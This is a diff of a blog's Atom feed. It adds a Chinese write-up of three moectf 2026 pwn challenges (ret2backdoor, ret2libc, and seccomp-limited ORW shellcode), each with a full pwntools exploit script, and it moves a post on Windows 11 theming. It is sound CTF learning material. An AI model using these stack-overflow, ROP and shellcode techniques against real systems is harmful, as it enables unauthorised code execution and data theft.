@@ -5,8 +5,482 @@
   <link href="https://dxfaker.top/" rel="alternate" type="text/html"/>
   <link href="https://dxfaker.top/atom.xml" rel="self" type="application/atom+xml"/>
   <id>https://dxfaker.top/</id>
-  <updated>2026-09-06T14:55:14.288Z</updated>
+  <updated>2026-09-08T14:41:52.912Z</updated>
   <language>en</language>
+  <entry>
+    <title>2026moectf第一周wp</title>
+    <link href="https://dxfaker.top/posts/26moe1/" rel="alternate" type="text/html"/>
+    <id>https://dxfaker.top/posts/26moe1/</id>
+    <published>2026-09-08T00:00:00.000Z</published>
+    <updated>2026-09-08T00:00:00.000Z</updated>
+    <summary>我是苦手</summary>
+    <content type="html"><![CDATA[<h1>走后门</h1>
+<pre><code>ssize_t vuln()
+{
+  int v1; // [rsp+Ch] [rbp-44h] BYREF
+  _BYTE buf[64]; // [rsp+10h] [rbp-40h] BYREF
+
+  puts(aMaybeIfYouGive);
+  puts("So how many do you want to give?");
+  __isoc99_scanf("%d", &amp;v1);
+  puts("Now plz give it to me");
+  if ( v1 &lt;= 0 )
+  {
+    puts("Don't get cute with me and I am not the genie.");
+    exit(0);
+  }
+  return read(0, buf, v1);
+}
+</code></pre>
+<p>很明显的栈溢出：读取的长度由我们自己决定，程序就原样往 <code>buf</code> 里写入这么多字节。</p>
+<p><code>buf</code> 长度为 64，再加上 8 字节的 saved rbp，构成第一部分的填充（共 72 字节）。</p>
+<pre><code>.text:0000000000401209 backdoor        proc near
+.text:0000000000401209 ; __unwind {
+.text:0000000000401209                 endbr64
+.text:000000000040120D                 push    rbp
+.text:000000000040120E                 mov     rbp, rsp
+.text:0000000000401211                 lea     rax, s          ; "If it's enough,you can get anything you"...
+.text:0000000000401218                 mov     rdi, rax        ; s
+.text:000000000040121B                 call    _puts
+.text:0000000000401220                 lea     rax, command    ; "/bin/sh"
+.text:0000000000401227                 mov     rdi, rax        ; command
+.text:000000000040122A                 call    _system
+.text:000000000040122F                 nop
+.text:0000000000401230                 pop     rbp
+.text:0000000000401231                 retn
+.text:0000000000401231 ; } // starts at 401209
+.text:0000000000401231 backdoor        endp
+.text:0000000000401231
+</code></pre>
+<p>IDA 里已经列出了后门函数，所以跳转地址确定为 <code>0x401209</code>。</p>
+<p>另外，由于 x86-64 的调用约定要求调用时 <code>rsp</code> 按 16 字节对齐（<code>system</code> 内部会使用 <code>movaps</code> 这类要求对齐的指令），而 <code>retn</code> 会多弹出一次栈，所以还需要在跳转地址前多加一个 8 字节的 <code>retn</code> 来把 <code>rsp</code> 对齐回去。</p>
+<pre><code>.text:0000000000401232 ; __unwind {
+.text:0000000000401232                 endbr64
+.text:0000000000401236                 push    rbp
+.text:0000000000401237                 mov     rbp, rsp
+.text:000000000040123A                 sub     rsp, 50h
+.text:000000000040123E                 lea     rax, aMaybeIfYouGive ; "Maybe if you give me enough things,you "...
+.text:0000000000401245                 mov     rdi, rax        ; s
+.text:0000000000401248                 call    _puts
+.text:000000000040124D                 lea     rax, aSoHowManyDoYou ; "So how many do you want to give?"
+.text:0000000000401254                 mov     rdi, rax        ; s
+.text:0000000000401257                 call    _puts
+.text:000000000040125C                 lea     rax, [rbp+var_44]
+.text:0000000000401260                 mov     rsi, rax
+.text:0000000000401263                 lea     rax, aD         ; "%d"
+.text:000000000040126A                 mov     rdi, rax
+.text:000000000040126D                 mov     eax, 0
+.text:0000000000401272                 call    ___isoc99_scanf
+.text:0000000000401277                 lea     rax, aNowPlzGiveItTo ; "Now plz give it to me"
+.text:000000000040127E                 mov     rdi, rax        ; s
+.text:0000000000401281                 call    _puts
+.text:0000000000401286                 mov     eax, [rbp+var_44]
+.text:0000000000401289                 test    eax, eax
+.text:000000000040128B                 jle     short loc_4012A6
+.text:000000000040128D                 mov     eax, [rbp+var_44]
+.text:0000000000401290                 movsxd  rdx, eax        ; nbytes
+.text:0000000000401293                 lea     rax, [rbp+buf]
+.text:0000000000401297                 mov     rsi, rax        ; buf
+.text:000000000040129A                 mov     edi, 0          ; fd
+.text:000000000040129F                 call    _read
+.text:00000000004012A4                 jmp     short locret_4012BF
+.text:00000000004012A6 ; ---------------------------------------------------------------------------
+.text:00000000004012A6
+.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: vuln+59↑j
+.text:00000000004012A6                 lea     rax, aDonTGetCuteWit ; "Don't get cute with me and I am not the"...
+.text:00000000004012AD                 mov     rdi, rax        ; s
+.text:00000000004012B0                 call    _puts
+.text:00000000004012B5                 mov     edi, 0          ; status
+.text:00000000004012BA                 call    _exit
+.text:00000000004012BF ; ---------------------------------------------------------------------------
+.text:00000000004012BF
+.text:00000000004012BF locret_4012BF:                          ; CODE XREF: vuln+72↑j
+.text:00000000004012BF                 leave
+.text:00000000004012C0                 retn
+.text:00000000004012C0 ; } // starts at 401232
+.text:00000000004012C0 vuln            endp
+</code></pre>
+<p>注意到这里正好有一个现成的 <code>retn</code>，那就先塞这个地址（<code>0x4012C0</code>），再接上后门地址。</p>
+<p>我的payload</p>
+<pre><code>from pwn import *
+p = process("./pwn")
+p.recvuntil(b'So how many do you want to give?')
+p.sendline(b'88')
+p.recvuntil(b'Now plz give it to me')
+payload = b'A' * 72 + p64(0x4012C0) + p64(0x401209)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1>helloworld</h1>
+<p>我差点他妈的就跑去查壳了（</p>
+<p><img src="https://dxfaker.top/images/post/023f2f84-2a07-469e-9ed3-92c2e0966bd3.png" alt="023f2f84-2a07-469e-9ed3-92c2e0966bd3" /></p>
+<p><strong>RUNPATH</strong> 为 <code>b'.'</code>，说明题目额外提供的那个 <code>libc.so.6</code> 要派上用场了，也就是：</p>
+<pre><code>libc = ELF('./libc.so.6')
+</code></pre>
+<p>先看main函数</p>
+<pre><code>int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  init(argc, argv, envp);
+  puts("Check your programming skill:");
+  puts("fill in the blank:");
+  puts("#include &lt;stdio.h&gt;");
+  puts("#include &lt;stdlib.h&gt;");
+  puts(&amp;byte_402081);
+  puts("int main(){");
+  puts("    _______ (\"Hello World!\");");
+  puts("    return 0;");
+  puts("}");
+  puts("Your answer:");
+  read(0, buf, 0x1Fu);
+  buf[strcspn(buf, "\n")] = 0;
+  if ( !strcmp(buf, "puts") )
+  {
+    printf("This function seems to be unsafe,right? %p\n", &amp;puts);
+  }
+  else if ( !strcmp(buf, "printf") )
+  {
+    printf("This function seems to be unsafe,right? %p\n", &amp;printf);
+  }
+  else
+  {
+    puts("Go and learn more about C and libc");
+  }
+  vuln();
+  return 0;
+}
+</code></pre>
+<p>这里有一个 <code>buf</code> 输入及检测：输入 <code>puts</code> 可以让程序打印出 <code>puts</code> 的真实地址，随后程序会进入 <code>vuln</code>。</p>
+<pre><code>ssize_t vuln()
+{
+  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF
+
+  puts("Now show me your real pwn skill:");
+  return read(0, buf, 0xC8u);
+}
+</code></pre>
+<p><code>0xC8</code> 明显大于 64，所以这里存在栈溢出，现在就可以考虑构造 payload 了。</p>
+<p><code>0x40 = 64</code>，刚好填满 <code>buf</code>，再加上 8 字节的 saved rbp，之后就是我们可以控制的返回地址。</p>
+<p>在二进制里搜了一圈，没找到 <code>system</code>。</p>
+<p>那就是该上动态调试了</p>
+<p><img src="https://dxfaker.top/images/post/fe98ca24-13e5-4a0a-8242-9921a3bde5a2.png" alt="fe98ca24-13e5-4a0a-8242-9921a3bde5a2" /></p>
+<p>没有 PIE，开启了 NX，并且有 RUNPATH。</p>
+<pre><code>RUNPATH:    b'.'
+</code></pre>
+<blockquote>
+<p>这表示程序的 <code>RUNPATH</code> 被设置为 <code>.</code>（当前目录）。也就是说，程序运行时，动态链接器会<strong>优先在当前工作目录搜索共享库</strong>。</p>
+</blockquote>
+<p><img src="https://dxfaker.top/images/post/0316349b-e03b-4afa-a684-8f48361f89ed.png" alt="0316349b-e03b-4afa-a684-8f48361f89ed" /></p>
+<p>可以看到，输入 64 个字符就已经把 <code>buf</code> 填满了，再加上 8 字节的 saved rbp，也就是 72 字节之后就开始覆盖返回地址了；而且每次调试时 <code>puts</code> 的地址都是随机变化的（ASLR 导致 libc 基址随机）。</p>
+<p>那么下一个问题就是 <code>ret</code> 和 <code>pop rdi; ret</code> 这两个 gadget 的地址。</p>
+<pre><code>(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/moectf/Hello-World01/helloworld/helloworld$ ROPgadget --binary pwn | grep "pop rdi ; ret"
+0x00000000004013d3 : pop rdi ; ret
+(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/moectf/Hello-World01/helloworld/helloworld$ ROPgadget --binary pwn | grep -m1 ": ret$"
+0x000000000040101a : ret
+</code></pre>
+<p>这些 gadget 在 IDA 里看不到，所以得用 ROPgadget。</p>
+<p>然后就是利用题目提供的 <code>libc.so.6</code> 了。</p>
+<p>在主程序里找半天都没找到 <code>system</code> 和 <code>/bin/sh</code>，那就去另一个文件里找：</p>
+<pre><code>(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/moectf/Hello-World01/helloworld/helloworld$ strings -a -t x libc.so.6.orig | grep '/bin/sh'
+ 1b45bd /bin/sh
+(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/moectf/Hello-World01/helloworld/helloworld$ nm -D libc.so.6.orig | grep -w system
+0000000000052290 W system@@GLIBC_2.2.5
+</code></pre>
+<p>但要注意，函数的真实地址 = libc 基址 + 偏移，这也正是程序一开始就白送一个 <code>puts</code> 地址的原因 —— 我们只能利用这个已知地址来反推 libc 基址。</p>
+<p>那就可以结束战斗了</p>
+<pre><code>from pwn import *
+
+context.arch = 'amd64'
+elf  = ELF('./pwn')
+libc = ELF('./libc.so.6')
+
+pop_rdi   = 0x4013d3
+align_ret = 0x40101a
+
+p = process('./pwn')
+
+p.recvuntil(b'Your answer:')
+p.sendline(b'puts')
+
+p.recvuntil(b'0x')
+leak = int(p.recvline().strip(), 16)
+log.success(f'puts = {hex(leak)}')
+
+libc.address = leak - libc.symbols['puts']
+system = libc.symbols['system']
+binsh  = next(libc.search(b'/bin/sh'))
+
+p.recvuntil(b'Now show me your real pwn skill:')
+payload  = b'A' * 72
+payload += p64(align_ret)
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(system)
+p.send(payload)
+
+p.interactive()
+
+</code></pre>
+<h1>ezpwn02</h1>
+<p>先checksec</p>
+<pre><code>checksec chall
+[*] '/mnt/d/ctf/flag/pwn/moectf/ezpwn02/pwn-ezpwn2/chall'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+</code></pre>
+<p>再看 main 函数的逻辑，这是一道经典的 ORW（open-read-write）题。</p>
+<blockquote>
+<p>注意 <code>mmap(0, 0x1000u, 7, 34, -1, 0)</code> 的第三个参数 prot = 7，也就是 RWX = Read（可读）+ Write（可写）+ eXecute（可执行），指一块内存页同时具备这三种权限。</p>
+</blockquote>
+<pre><code>int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char *v3; // rax
+  void (__fastcall *v4)(_QWORD); // rbx
+  _BYTE *v5; // rsi
+  char *v6; // rax
+  unsigned int buf; // [rsp+1Ch] [rbp-7Ch] BYREF
+  _QWORD v9[2]; // [rsp+20h] [rbp-78h] BYREF
+  _QWORD v10[13]; // [rsp+30h] [rbp-68h] BYREF
+
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  puts("ezpwn02");
+  puts("stage1: max 40 bytes");
+  puts("badchars: 00 0a 20 2f 66 6c 61 67");  // 禁用字符
+  puts("seccomp: read/write/openat/exit only");  // 只允许这几个功能出现
+  buf = 0;
+  read_exact_constprop_0((char *)&amp;buf, 4u);
+  if ( buf - 1 &gt; 0x27 )
+  {
+    puts("bad stage1 length");
+    return 1;
+  }  // 限制长度在 1~40 之间
+  v3 = (char *)mmap(0, 0x1000u, 7, 34, -1, 0);
+  v4 = (void (__fastcall *)(_QWORD))v3;
+  if ( v3 == (char *)-1LL )
+  {
+    puts("mmap failed.");
+    return 1;
+  }
+  read_exact_constprop_0(v3, buf);
+  if ( buf )
+  {
+    v5 = v4;
+    while ( 2 )
+    {
+      v6 = (char *)&amp;badchars;
+      do
+      {
+        if ( *v5 == *v6 )
+        {
+          puts("badchar detected in stage1");
+          return 1;
+        }
+        ++v6;
+      }
+      while ( &amp;_GNU_EH_FRAME_HDR != (_UNKNOWN *)v6 );
+      if ( (char *)v4 + buf != ++v5 )
+        continue;
+      break;
+    }
+  }
+  puts("stage1 accepted");
+  v10[0] = 0x400000020LL;
+  v10[1] = 0xC000003E00010015LL;
+  v10[2] = 0x8000000000000006LL;
+  v10[5] = 0x100040015LL;
+  v10[9] = 0x8000000000000006LL;
+  v10[6] = 0x10100030015LL;
+  v10[10] = 0x7FFF000000000006LL;
+  v10[7] = 0x3C00020015LL;
+  v10[8] = 0xE700010015LL;
+  v9[1] = v10;
+  v10[3] = 32;
+  v10[4] = 327701;
+  v9[0] = 11;
+  if ( prctl(38, 1, 0, 0, 0) || prctl(22, 2, v9) )
+    _exit(1);
+  v4(v4);
+  return 0;
+}
+</code></pre>
+<p>可以看到程序给出的 badchars（坏字符）列表：</p>
+<table>
+<thead>
+<tr>
+<th>字节</th>
+<th>缩写</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>00</code></td>
+<td>NUL</td>
+<td>空字符，字符串终止符</td>
+</tr>
+<tr>
+<td><code>0a</code></td>
+<td>LF</td>
+<td>换行符 <code>\n</code></td>
+</tr>
+<tr>
+<td><code>20</code></td>
+<td>SPACE</td>
+<td>空格</td>
+</tr>
+<tr>
+<td><code>2f</code></td>
+<td><code>/</code></td>
+<td>斜杠</td>
+</tr>
+<tr>
+<td><code>66</code></td>
+<td><code>f</code></td>
+<td>字母 f</td>
+</tr>
+<tr>
+<td><code>6c</code></td>
+<td><code>l</code></td>
+<td>字母 l</td>
+</tr>
+<tr>
+<td><code>61</code></td>
+<td><code>a</code></td>
+<td>字母 a</td>
+</tr>
+<tr>
+<td><code>67</code></td>
+<td><code>g</code></td>
+<td>字母 g</td>
+</tr>
+</tbody>
+</table>
+<pre><code>if ( buf )
+  {
+    v5 = v4;
+    while ( 2 )
+    {
+      v6 = (char *)&amp;badchars;
+      do
+      {
+        if ( *v5 == *v6 )
+        {
+          puts("badchar detected in stage1");
+          return 1;
+        }
+        ++v6;
+      }
+</code></pre>
+<p>一旦检测到 badchar，程序就会直接打印提示并 <code>return 1</code> 退出。</p>
+<p>也就是说，不能直接写入 <code>/flag</code> 这样的字符串 —— <code>/</code> 和 flag 的四个字母全在禁用列表里。</p>
+<pre><code>read_exact_constprop_0((char *)&amp;buf, 4u);   // ① 读取 4 字节，存入 buf
+if ( buf - 1 &gt; 0x27 )                        // ② 检查 buf 是否在 1~40 之间
+{
+    // ...（长度不合法则退出）
+read_exact_constprop_0(v3, buf);             // ③ 读取 buf 字节的 shellcode
+</code></pre>
+<p>OK那我们来复习一下把大象关进冰箱要几步</p>
+<ol>
+<li>打开 flag 文件。</li>
+<li>读取文件内容。</li>
+<li>输出文件内容。</li>
+<li>退出程序。</li>
+</ol>
+<p>也就是 <code>openat</code>、<code>read</code>、<code>write</code>、<code>exit</code> 四个系统调用。</p>
+<p>但很明显，stage1 有 40 字节的长度限制，还有坏字符限制，无法一次性把 payload 全部塞进去。</p>
+<p>不过注意到 <code>mmap</code> 分配了 0x1000 字节且可读可写可执行的内存，而程序最后又通过 <code>v4(v4)</code> 跳转到这块内存去执行我们写入的内容。那就意味着：我们可以先用一次 <code>read</code> 把更长的 payload 读进这块内存（这次读取的长度由我们自己决定），再跳转过去执行。</p>
+<p>鸡毛检查都没有，那我不就结束战斗了</p>
+<pre><code>read(0, page + 0x40, 0x1000);
+</code></pre>
+<p>编译</p>
+<pre><code>mov rsi, rdi ;rsi为页首地址
+add rsi, 0x40 
+xor edi, edi 
+xor edx, edx
+mov dh, 0x10
+xor eax, eax
+syscall
+jmp rsi ;跳转到 rsi（即页首 + 0x40）处，执行刚刚读入的第二阶段 shellcode。
+</code></pre>
+<p>第二阶段：</p>
+<p>打开、读取、输出、退出。</p>
+<pre><code>int fd = openat(-100, "flag", 0, 0);   // 打开文件
+char buf[0x100];
+int n  = read(fd, buf, sizeof buf);    // 读内容
+write(1, buf, n);                       // 打到标准输出
+_exit(0);
+</code></pre>
+<p>那么 <code>read</code> 需要的东西：</p>
+<pre><code>ssize_t read(int fd, void *buf, size_t count);
+</code></pre>
+<pre><code>stage2  = asm(shellcraft.amd64.linux.openat(-100, '/flag', 0, 0))
+stage2 += asm(shellcraft.amd64.linux.read('rax', 'rsp', 0x100))
+stage2 += asm(shellcraft.amd64.linux.write(1, 'rsp', 'rax'))
+stage2 += asm(shellcraft.amd64.linux.exit(0))
+</code></pre>
+<pre><code>read('rax', 'rsp', 0x100)
+#      ↑       ↑       ↑
+#      fd      buf     长度
+#   rax 的值  rsp 的值  0x100
+
+</code></pre>
+<p>再复习一下：<code>rax</code> 用来接收 <code>openat</code> 的返回值（也就是文件描述符 fd），缓冲区直接丢在可写的栈上（<code>rsp</code>），最后写到标准输出并退出。</p>
+<pre><code>进程 A 的文件表(fd)
+┌────┬──────────────────┐
+│ 0  │ → 终端输入        │
+│ 1  │ → 终端输出        │
+│ 2  │ → 终端错误        │
+│ 3  │ → flag 文件  ★   │  ← openat 返回 3，就是这张表的“行号”
+└────┴──────────────────┘
+
+</code></pre>
+<p>也就是</p>
+<pre><code>from pwn import *
+
+context.arch = 'amd64'
+context.os = 'linux'
+context.log_level = 'info'
+
+BAD = b'\x00\x0a\x20\x2f\x66\x6c\x61\x67'
+
+stage1 = asm('''
+    mov rsi, rdi
+    xor edi, edi
+    add rsi, 0x40
+    xor edx, edx
+    mov dh, 0x10
+    xor eax, eax
+    syscall
+    jmp rsi
+''')
+
+stage2  = asm(shellcraft.amd64.linux.openat(-100, '/flag', 0, 0))
+stage2 += asm(shellcraft.amd64.linux.read('rax', 'rsp', 0x100))
+stage2 += asm(shellcraft.amd64.linux.write(1, 'rsp', 'rax'))
+stage2 += asm(shellcraft.amd64.linux.exit(0))
+
+# io = remote('127.0.0.1', 64835)
+io = process("./chall")
+io.recvuntil(b'seccomp: read/write/openat/exit only\n')
+io.send(p32(len(stage1)) + stage1 + stage2)
+
+out = io.recvall(timeout=6)
+print(out.decode(errors='replace'))
+
+</code></pre>
+]]></content>
+    <author>
+      <name></name>
+    </author>
+    <category term="wp"></category>
+  </entry>
   <entry>
     <title>今晚聊完</title>
     <link href="https://dxfaker.top/posts/2696/" rel="alternate" type="text/html"/>
@@ -1887,91 +2361,6 @@ Verification and Post-Silicon Validation[M]. now publishers, 2024.</p>
     <category term="导读类"></category>
   </entry>
   <entry>
-    <title>基于win11的主题优化</title>
-    <link href="https://dxfaker.top/posts/%E5%9F%BA%E4%BA%8Ewin11%E7%9A%84%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/" rel="alternate" type="text/html"/>
-    <id>https://dxfaker.top/posts/%E5%9F%BA%E4%BA%8Ewin11%E7%9A%84%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/</id>
-    <published>2026-03-05T00:00:00.000Z</published>
-    <updated>2026-03-05T00:00:00.000Z</updated>
-    <summary>分享一下</summary>
-    <content type="html"><![CDATA[<h1>写在前面</h1>
-<p>镇楼：另一个世界线的我，希望看到这里的读者能像他们一样把握住机会，不要让自己后悔吧</p>
-<p>不然，在你成熟前你就要一直内耗了</p>
-<p>（</p>
-<h1>正题</h1>
-<p><img src="https://dxfaker.top/images/post/26.3.5.3.png" alt="26.3.5.3" /></p>
-<p>这个是最终的效果，如果觉得生活太如意的话，大可以把任务栏再删的精简一点</p>
-<h2>壁纸（付费）</h2>
-<p>wallpaper，这个我就不多说了，找个中意的壁纸下载就行了，至于别的内容，甚至某些壁纸，也谨慎下载，毕竟你也不知道里面装了些什么</p>
-<p>其实还有一个低配， 我记得叫 livepaper来着，不过那个壁纸就得你自己去找了</p>
-<h2>任务栏</h2>
-<p><strong>TranslucentTB</strong>（微软商店免费）</p>
-<p>作用：任务栏透明/亚克力效果
-操作：安装后，在系统托盘图标中选择 <strong>“清晰”</strong>（全透明）或 <strong>“亚克力”</strong>（毛玻璃）</p>
-<p>我选择的是全透明</p>
-<p><strong>RoundedTB</strong>（微软商店免费）
-作用：任务栏圆角 + 悬浮（设置边距 Margin）
-操作：安装后，在设置中调整 <strong>Margin（边距）</strong> 数值（如底部设为 <code>5</code>），实现四边悬空</p>
-<p>作用不是很明显，可下可不下</p>
-<h2>文件资源管理器</h2>
-<p><strong>ExplorerBlurMica</strong>（GitHub开源）</p>
-<p>窗口背景半透明（透出桌面）</p>
-<p>窗口全透明要搞麻烦一点的</p>
-<ul>
-<li>
-<p><strong>操作步骤</strong>：</p>
-<ol>
-<li>
-<p>下载并解压到文件夹（如 <code>Release_x64</code>）</p>
-</li>
-<li>
-<p>用记事本打开 <code>config.ini</code>，修改关键参数：</p>
-<p>ini</p>
-<pre><code>effect = 1          
-[light]
-a = 0               ; 浅色模式透明度0（完全透明）
-[dark]
-a = 0               ; 深色模式透明度0
-</code></pre>
-</li>
-<li>
-<p><strong>以管理员身份运行</strong> <code>register.cmd</code></p>
-</li>
-<li>
-<p>重启资源管理器（任务管理器重启“Windows 资源管理器”或重启电脑）</p>
-</li>
-</ol>
-</li>
-<li>
-<p><strong>卸载方法</strong>：以管理员身份运行同文件夹下的 <code>uninstall.cmd</code> 并重启资源管理器</p>
-</li>
-</ul>
-<h2>Windows 终端 (PowerShell / WSL)</h2>
-<ul>
-<li><strong>目标</strong>：亚克力透明背景</li>
-<li><strong>工具</strong>：Windows Terminal 自带功能</li>
-<li><strong>操作步骤</strong>：
-<ol>
-<li>打开 Windows Terminal，点击下拉菜单 → <strong>设置</strong></li>
-<li>左侧选择配置文件（如“Windows PowerShell”或“Ubuntu”）</li>
-<li>点击 <strong>“外观”</strong></li>
-<li>将 <strong>“背景效果”</strong> 从“不透明”改为 <strong>“亚克力”</strong></li>
-<li>调整下方 <strong>“亚克力不透明度”</strong> 滑块（如 70%）</li>
-<li>点击 <strong>“保存”</strong></li>
-</ol>
-</li>
-</ul>
-<p><img src="https://dxfaker.top/images/post/26.3.5.4.png" alt="26.3.5.4" /></p>
-<p>要是觉得影响注意力了把板子加上去就是了</p>
-<h1>final</h1>
-<p>推荐一首歌：洛天依的千金胧梦</p>
-<p>今天莫名其妙压抑了起来，该🛫了</p>
-]]></content>
-    <author>
-      <name></name>
-    </author>
-    <category term="经验分享"></category>
-  </entry>
-  <entry>
     <title>处理线性方程组题型</title>
     <link href="https://dxfaker.top/posts/2634/" rel="alternate" type="text/html"/>
     <id>https://dxfaker.top/posts/2634/</id>
@@ -2595,6 +2984,91 @@ else:
       <name></name>
     </author>
     <category term="WP"></category>
+  </entry>
+  <entry>
+    <title>基于win11的主题优化</title>
+    <link href="https://dxfaker.top/posts/%E5%9F%BA%E4%BA%8Ewin11%E7%9A%84%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/" rel="alternate" type="text/html"/>
+    <id>https://dxfaker.top/posts/%E5%9F%BA%E4%BA%8Ewin11%E7%9A%84%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/</id>
+    <published>2026-03-05T00:00:00.000Z</published>
+    <updated>2026-03-05T00:00:00.000Z</updated>
+    <summary>分享一下</summary>
+    <content type="html"><![CDATA[<h1>写在前面</h1>
+<p>镇楼：另一个世界线的我，希望看到这里的读者能像他们一样把握住机会，不要让自己后悔吧</p>
+<p>不然，在你成熟前你就要一直内耗了</p>
+<p>（</p>
+<h1>正题</h1>
+<p><img src="https://dxfaker.top/images/post/26.3.5.3.png" alt="26.3.5.3" /></p>
+<p>这个是最终的效果，如果觉得生活太如意的话，大可以把任务栏再删的精简一点</p>
+<h2>壁纸（付费）</h2>
+<p>wallpaper，这个我就不多说了，找个中意的壁纸下载就行了，至于别的内容，甚至某些壁纸，也谨慎下载，毕竟你也不知道里面装了些什么</p>
+<p>其实还有一个低配， 我记得叫 livepaper来着，不过那个壁纸就得你自己去找了</p>
+<h2>任务栏</h2>
+<p><strong>TranslucentTB</strong>（微软商店免费）</p>
+<p>作用：任务栏透明/亚克力效果
+操作：安装后，在系统托盘图标中选择 <strong>“清晰”</strong>（全透明）或 <strong>“亚克力”</strong>（毛玻璃）</p>
+<p>我选择的是全透明</p>
+<p><strong>RoundedTB</strong>（微软商店免费）
+作用：任务栏圆角 + 悬浮（设置边距 Margin）
+操作：安装后，在设置中调整 <strong>Margin（边距）</strong> 数值（如底部设为 <code>5</code>），实现四边悬空</p>
+<p>作用不是很明显，可下可不下</p>
+<h2>文件资源管理器</h2>
+<p><strong>ExplorerBlurMica</strong>（GitHub开源）</p>
+<p>窗口背景半透明（透出桌面）</p>
+<p>窗口全透明要搞麻烦一点的</p>
+<ul>
+<li>
+<p><strong>操作步骤</strong>：</p>
+<ol>
+<li>
+<p>下载并解压到文件夹（如 <code>Release_x64</code>）</p>
+</li>
+<li>
+<p>用记事本打开 <code>config.ini</code>，修改关键参数：</p>
+<p>ini</p>
+<pre><code>effect = 1          
+[light]
+a = 0               ; 浅色模式透明度0（完全透明）
+[dark]
+a = 0               ; 深色模式透明度0
+</code></pre>
+</li>
+<li>
+<p><strong>以管理员身份运行</strong> <code>register.cmd</code></p>
+</li>
+<li>
+<p>重启资源管理器（任务管理器重启“Windows 资源管理器”或重启电脑）</p>
+</li>
+</ol>
+</li>
+<li>
+<p><strong>卸载方法</strong>：以管理员身份运行同文件夹下的 <code>uninstall.cmd</code> 并重启资源管理器</p>
+</li>
+</ul>
+<h2>Windows 终端 (PowerShell / WSL)</h2>
+<ul>
+<li><strong>目标</strong>：亚克力透明背景</li>
+<li><strong>工具</strong>：Windows Terminal 自带功能</li>
+<li><strong>操作步骤</strong>：
+<ol>
+<li>打开 Windows Terminal，点击下拉菜单 → <strong>设置</strong></li>
+<li>左侧选择配置文件（如“Windows PowerShell”或“Ubuntu”）</li>
+<li>点击 <strong>“外观”</strong></li>
+<li>将 <strong>“背景效果”</strong> 从“不透明”改为 <strong>“亚克力”</strong></li>
+<li>调整下方 <strong>“亚克力不透明度”</strong> 滑块（如 70%）</li>
+<li>点击 <strong>“保存”</strong></li>
+</ol>
+</li>
+</ul>
+<p><img src="https://dxfaker.top/images/post/26.3.5.4.png" alt="26.3.5.4" /></p>
+<p>要是觉得影响注意力了把板子加上去就是了</p>
+<h1>final</h1>
+<p>推荐一首歌：洛天依的千金胧梦</p>
+<p>今天莫名其妙压抑了起来，该🛫了</p>
+]]></content>
+    <author>
+      <name></name>
+    </author>
+    <category term="经验分享"></category>
   </entry>
   <entry>
     <title>今日一题</title>
